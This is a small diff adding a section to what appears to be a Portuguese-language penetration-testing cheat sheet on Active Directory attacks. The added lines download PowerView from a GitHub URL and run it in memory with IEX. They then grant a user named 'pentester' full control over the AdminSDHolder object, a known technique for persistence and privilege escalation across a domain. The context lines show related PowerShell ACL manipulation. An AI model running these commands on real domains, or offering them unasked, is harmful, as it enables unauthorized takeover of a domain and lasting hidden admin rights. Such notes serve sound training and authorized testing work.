@@ -1618,6 +1618,13 @@ $MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,
 $MyACL.AddAccessRule($MyACE)
 Set-acl -aclobject $MyACL $MyDistinguishedNameAD
 ```
+##### ADMIN SDHOLDER - ADICIONAR FULL CONTROLL PARA USUARIO (POWERVIEW)
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
+```
+```
+Add-ObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights All -Verbose
+```
 
 
 
